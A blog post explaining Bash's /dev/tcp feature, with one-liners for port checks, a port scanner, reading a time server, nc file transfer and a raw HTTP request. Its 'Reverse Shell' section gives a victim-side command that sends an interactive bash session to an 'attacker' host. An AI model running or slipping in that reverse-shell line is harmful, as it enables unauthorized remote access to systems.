---
layout: post
title: Bash-ing your network with /dev/tcp
excerpt: In Bash, `/dev/tcp` is a special file that allows you to establish network connections using the TCP/IP protocol. It provides a simple way to communicate with remote servers over a network.

Using `/dev/tcp`, you can open a network socket and read from or write to it, similar to how you would read from or write to a file. This feature is primarily available in Bash shells on Unix-like systems.

It can be accessed for multiple reasons but the basic operation of it is to open a raw TCP stream.
/dev/udp is also valid.
author: stefanos_kalandaridis
categories:
- troubleshooting
- networking
- security
tags:
- bash
- networking
- http
- security
---
## /dev/tcp is a file descriptor of bash shell

In Bash, `/dev/tcp` is a special file that allows you to establish network connections using the TCP/IP protocol. It provides a simple way to communicate with remote servers over a network.

Using `/dev/tcp`, you can open a network socket and read from or write to it, similar to how you would read from or write to a file. This feature is primarily available in Bash shells on Unix-like systems.

It can be accessed for multiple reasons but the basic operation of it is to open a raw TCP stream.
/dev/udp is also valid.

- [Port Scanning](#port-scanning)
- [Read TCP stream](#read-tcp-stream)
- [File Transfer](#file-transfer)
- [Reverse Shell](#reverse-shell)
- [HTTP Requests](#http-requests)

### Port scanning
#### One of the most common uses of it is to check if a port is open in a remote host
```
timeout 0.5 echo -n 2>/dev/null < /dev/tcp/127.0.0.1/7777 && echo "open" || echo "closed"
```

#### This can be extremely usefull in cases where a machine/container doesn't have nc, curl, wget or any other utility to check for network connection
Let's say we are in a kubernetes pod that runs on a minimal image having bash. We want to check if it can communicate with a service or if the service is actually listening on a port.
```
kubectl exec -it svc/random-service -- bash
$ echo < /dev/tcp/other-service.namespace.svc.cluster.local/7777 && echo "open" || echo "closed"
```

#### You can make a port scanner with a one liner (and it's pretty fast)
```
for port in {1..8888}; do timeout 0.5 echo -n 2>/dev/null < /dev/tcp/127.0.0.1/$port && echo "$port/tcp open"; done
```

### Read TCP stream
#### Get the time from nist.gov
```
cat < /dev/tcp/time.nist.gov/13
```

### File Transfer
#### Sender
```
nc -lvnp 7777 < file.txt
```
#### Receiver
```
cat < /dev/tcp/sender/7777 > file.txt
```

#### Alternatively 

#### Receiver
```
nc -lvnp 7777 > file.txt
```
#### Sender
```
cat file.txt > /dev/tcp/receiver/7777
```

### Reverse Shell
#### Attacker
```
nc -lvnp 7777
```
#### Victim
```
bash -c 'bash -i >& /dev/tcp/attacker/7777 0>&1'
```

### HTTP Requests
#### Fetching the `www.google.com` page
```
exec 5<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: www.google.com\r\nConnection: close\r\n\r\n" >&5
cat <&5
```


#### References 
https://tldp.org/LDP/abs/html/devref1.html
https://w0lfram1te.com/exploring-dev-tcp